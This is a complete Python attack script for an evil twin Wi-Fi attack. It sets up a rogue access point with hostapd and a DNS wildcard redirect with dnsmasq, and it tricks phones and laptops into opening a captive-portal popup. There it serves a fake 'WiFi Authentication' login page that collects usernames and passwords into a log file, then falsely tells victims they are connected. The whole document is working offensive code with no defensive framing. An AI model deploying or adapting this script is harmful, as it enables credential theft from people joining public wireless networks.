#!/usr/bin/env python3
"""
Evil Twin Attack Script - DNS-Only Redirect (No iptables required)
Works without NAT table support
"""

import subprocess
import time
import os
import sys
from pathlib import Path
from http.server import BaseHTTPRequestHandler, HTTPServer
import json


class EvilTwinAttack:
    """Evil Twin with DNS-only redirect - no iptables needed"""

    def __init__(self, interface, ssid, portal_dir):
        self.interface = interface
        self.ssid = ssid
        self.portal_dir = Path(portal_dir)
        self.gateway_ip = "10.0.0.1"
        self.dhcp_range_start = "10.0.0.10"
        self.dhcp_range_end = "10.0.0.100"

        # Config file paths
        self.hostapd_conf = "/etc/hostapd/evil_twin.conf"
        self.dnsmasq_conf = "/etc/dnsmasq.d/evil_twin.conf"
        self.dnsmasq_log = "/var/log/dnsmasq_evil.log"
        self.dnsmasq_leases = "/var/lib/misc/dnsmasq.leases"


    def check_root(self):
        """Verify script is running as root"""
        if os.geteuid() != 0:
            print("[!] This script must be run as root")
            sys.exit(1)


    def kill_processes(self):
        """Kill any existing hostapd/dnsmasq processes"""
        print("[*] Killing existing processes...")
        subprocess.run(["pkill", "hostapd"], check=False, stderr=subprocess.DEVNULL)
        subprocess.run(["pkill", "dnsmasq"], check=False, stderr=subprocess.DEVNULL)
        time.sleep(1)


    def configure_interface(self):
        """Configure network interface with static IP"""
        print(f"[*] Configuring {self.interface}...")

        # Stop NetworkManager
        subprocess.run(["systemctl", "stop", "NetworkManager"], check=False, stderr=subprocess.DEVNULL)

        # Configure interface
        subprocess.run(["ip", "link", "set", self.interface, "down"], check=True)
        subprocess.run(["ip", "addr", "flush", "dev", self.interface], check=True)
        subprocess.run(["ip", "addr", "add", f"{self.gateway_ip}/24", "dev", self.interface], check=True)
        subprocess.run(["ip", "link", "set", self.interface, "up"], check=True)

        time.sleep(2)

        # Verify
        result = subprocess.run(["ip", "addr", "show", self.interface],
                              capture_output=True, text=True)
        if self.gateway_ip not in result.stdout:
            print(f"[!] Failed to set IP on {self.interface}")
            return False

        print(f"[+] Interface configured with IP {self.gateway_ip}")
        return True


    def create_hostapd_config(self):
        """Create hostapd configuration"""
        print("[*] Creating hostapd config...")
        subprocess.run(["mkdir", "-p", "/etc/hostapd"], check=True)

        config = f"""interface={self.interface}
driver=nl80211
ssid={self.ssid}
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""

        with open(self.hostapd_conf, 'w') as f:
            f.write(config)

        subprocess.run(["chmod", "644", self.hostapd_conf], check=True)
        print(f"[+] hostapd config created")


    def create_dnsmasq_config(self):
        """Create dnsmasq config - DNS wildcard redirect"""
        print("[*] Creating dnsmasq config...")
        subprocess.run(["mkdir", "-p", "/etc/dnsmasq.d"], check=True)
        subprocess.run(["mkdir", "-p", "/var/lib/misc"], check=True)
        subprocess.run(["mkdir", "-p", "/var/log"], check=True)

        # KEY: address=/#/ redirects ALL DNS to our IP (no iptables needed!)
        config = f"""# Interface
interface={self.interface}
bind-interfaces
listen-address={self.gateway_ip}

# DHCP
dhcp-range={self.dhcp_range_start},{self.dhcp_range_end},12h
dhcp-option=3,{self.gateway_ip}
dhcp-option=6,{self.gateway_ip}
dhcp-authoritative

# DNS - Redirect ALL domains to our portal (wildcard)
address=/#/{self.gateway_ip}
no-resolv
no-hosts

# Logging
log-dhcp
log-queries
log-facility={self.dnsmasq_log}

# Lease file
dhcp-leasefile={self.dnsmasq_leases}
"""

        with open(self.dnsmasq_conf, 'w') as f:
            f.write(config)

        subprocess.run(["chmod", "644", self.dnsmasq_conf], check=True)
        print(f"[+] dnsmasq config created")


    def start_hostapd(self):
        """Start hostapd"""
        print("[*] Starting hostapd...")

        proc = subprocess.Popen(
            ["hostapd", self.hostapd_conf],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        time.sleep(3)

        if proc.poll() is not None:
            print("[!] hostapd failed to start")
            _, err = proc.communicate()
            print(f"Error: {err.decode()}")
            return False

        print("[+] hostapd started")
        return True


    def start_dnsmasq(self):
        """Start dnsmasq"""
        print("[*] Starting dnsmasq...")

        result = subprocess.run(
            ["dnsmasq", "-C", self.dnsmasq_conf],
            capture_output=True,
            text=True
        )

        if result.returncode != 0:
            print(f"[!] dnsmasq failed: {result.stderr}")
            return False

        time.sleep(1)
        check = subprocess.run(["pgrep", "dnsmasq"], capture_output=True)

        if check.returncode != 0:
            print("[!] dnsmasq not running")
            return False

        pid = check.stdout.decode().strip()
        print(f"[+] dnsmasq started (PID: {pid})")
        return True


    def start_web_server(self):
        """Start captive portal web server - responds to ALL requests"""
        print(f"[*] Starting captive portal server on port 80...")

        portal_index = self.portal_dir / "index.html"

        class CaptivePortalHandler(BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                """Suppress default logging"""
                pass

            def do_GET(self):
                """Handle ALL GET requests - serve portal for everything"""

                # Captive portal detection URLs - respond with wrong data to trigger popup
                if self.path in ['/hotspot-detect.html', '/library/test/success.html']:
                    # Apple expects "Success" - give different response
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(b'<!DOCTYPE html><html><body>Redirect</body></html>')
                    print(f"[+] Apple captive portal detection triggered")
                    return

                if self.path in ['/generate_204', '/gen_204']:
                    # Android expects 204 - give 200 with content
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(b'<!DOCTYPE html><html><body>Redirect</body></html>')
                    print(f"[+] Android captive portal detection triggered")
                    return

                if self.path in ['/ncsi.txt', '/connecttest.txt']:
                    # Windows expects specific text - give wrong text
                    self.send_response(200)
                    self.send_header('Content-type', 'text/plain')
                    self.end_headers()
                    self.wfile.write(b'Redirect')
                    print(f"[+] Windows captive portal detection triggered")
                    return

                # For ALL other requests (ANY domain), serve the portal page
                try:
                    with open(portal_index, 'rb') as f:
                        content = f.read()

                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(content)

                except Exception as e:
                    self.send_response(404)
                    self.end_headers()
                    self.wfile.write(b'Portal page not found')

            def do_POST(self):
                """Handle credential capture"""
                if self.path == "/capture":
                    try:
                        content_length = int(self.headers.get('Content-Length', 0))
                        post_data = self.rfile.read(content_length)
                        data = post_data.decode('utf-8')

                        print(f"\n[!] CREDENTIALS CAPTURED: {data}\n")

                        # Save to file
                        with open("/var/log/captured_creds.txt", "a") as f:
                            f.write(f"{time.ctime()}: {data}\n")

                        self.send_response(200)
                        self.send_header("Content-type", "application/json")
                        self.end_headers()
                        self.wfile.write(b'{"status":"success"}')
                    except:
                        self.send_response(500)
                        self.end_headers()
                else:
                    self.send_response(404)
                    self.end_headers()

        server = HTTPServer(("0.0.0.0", 80), CaptivePortalHandler)
        print("[+] Captive portal server started")
        print("[+] Waiting for victims...\n")
        server.serve_forever()


    def cleanup(self):
        """Cleanup"""
        print("\n[*] Cleaning up...")
        subprocess.run(["pkill", "hostapd"], check=False)
        subprocess.run(["pkill", "dnsmasq"], check=False)
        subprocess.run(["ip", "addr", "flush", "dev", self.interface], check=False)
        subprocess.run(["systemctl", "start", "NetworkManager"], check=False)
        print("[+] Cleanup complete")


    def run(self):
        """Main execution"""
        try:
            self.check_root()
            self.kill_processes()

            if not self.configure_interface():
                return

            self.create_hostapd_config()
            self.create_dnsmasq_config()

            if not self.start_hostapd():
                self.cleanup()
                return

            if not self.start_dnsmasq():
                self.cleanup()
                return

            print("\n" + "="*60)
            print("Evil Twin Captive Portal Running (DNS-Only Redirect)")
            print("="*60)
            print(f"SSID: {self.ssid}")
            print(f"Gateway: {self.gateway_ip}")
            print(f"DHCP Range: {self.dhcp_range_start} - {self.dhcp_range_end}")
            print(f"Portal: {self.portal_dir}")
            print("="*60)
            print("NOTE: No iptables required - using DNS wildcard redirect")
            print("="*60)
            print("Press Ctrl+C to stop\n")

            self.start_web_server()

        except KeyboardInterrupt:
            self.cleanup()
        except Exception as e:
            print(f"\n[!] Error: {e}")
            self.cleanup()


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: sudo python3 evil_twin.py <interface> <ssid>")
        print("Example: sudo python3 evil_twin.py wlan1 'Free WiFi'")
        sys.exit(1)

    interface = sys.argv[1]
    ssid = sys.argv[2]

    # Portal is in parent directory (netcracker/portals/)
    script_dir = Path(__file__).parent.parent
    portal_dir = script_dir / "portals" / "portal_1"

    if not portal_dir.exists():
        print(f"[!] Creating portal directory: {portal_dir}")
        portal_dir.mkdir(parents=True, exist_ok=True)

        # Create basic captive portal page
        with open(portal_dir / "index.html", "w") as f:
            f.write("""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Authentication Required</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; background: #f0f0f0; }
        .portal { background: white; padding: 30px; border-radius: 10px; max-width: 400px; margin: 0 auto; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        button:hover { background: #0056b3; }
    </style>
</head>
<body>
    <div class="portal">
        <h2>WiFi Authentication</h2>
        <p>Please enter your credentials to access the internet</p>
        <form method="POST" action="/capture" onsubmit="return handleSubmit(event)">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Connect to WiFi</button>
        </form>
    </div>
    <script>
        function handleSubmit(e) {
            e.preventDefault();
            const form = e.target;
            const data = new FormData(form);
            const json = JSON.stringify(Object.fromEntries(data));

            fetch('/capture', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: json
            }).then(() => {
                alert('Connected! You now have internet access.');
                window.location.reload();
            });
            return false;
        }
    </script>
</body>
</html>""")
        print(f"[+] Created portal at {portal_dir}")

    attack = EvilTwinAttack(interface, ssid, portal_dir)
    attack.run()
